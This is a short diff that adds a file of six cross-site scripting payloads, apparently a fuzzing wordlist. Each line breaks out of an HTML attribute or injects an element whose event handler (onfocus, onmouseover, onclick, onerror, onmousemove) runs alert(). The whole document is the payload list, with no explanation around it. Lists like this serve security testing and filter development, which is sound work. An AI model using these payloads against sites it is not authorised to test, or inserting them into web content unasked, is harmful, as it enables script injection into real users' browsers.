@@ -1,0 +1,6 @@
+" autofocus onfocus=alert('XSS')"
+" onmouseover=alert('XSS')"
+" onclick=alert('XSS')"
+"><img src=x onerror=alert(1)>
+"><div onmouseover=alert('XSS')>Hover Me</div>
+<svg><circle onmousemove=alert('XSS')></circle></svg>
